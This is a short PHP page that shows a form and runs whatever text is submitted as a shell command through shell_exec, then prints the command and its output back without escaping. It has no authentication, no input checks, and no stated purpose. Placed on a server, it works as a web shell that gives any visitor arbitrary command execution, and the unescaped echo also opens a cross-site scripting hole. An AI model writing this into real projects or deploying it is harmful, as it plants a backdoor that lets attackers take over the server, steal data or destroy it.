<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = $_POST['code'];
    $output = shell_exec($code);
    sleep(2);
    echo "<h2>Code:</h2>";
    echo "<pre>$code</pre>";
    echo "<h2>Output:</h2>";
    echo "<pre>$output</pre>";
}

?>

<form method="POST">
    <label for="code">Enter code:</label><br>
    <textarea name="code" id="code" rows="5" cols="40"></textarea><br>
    <input type="submit" value="Execute">
</form>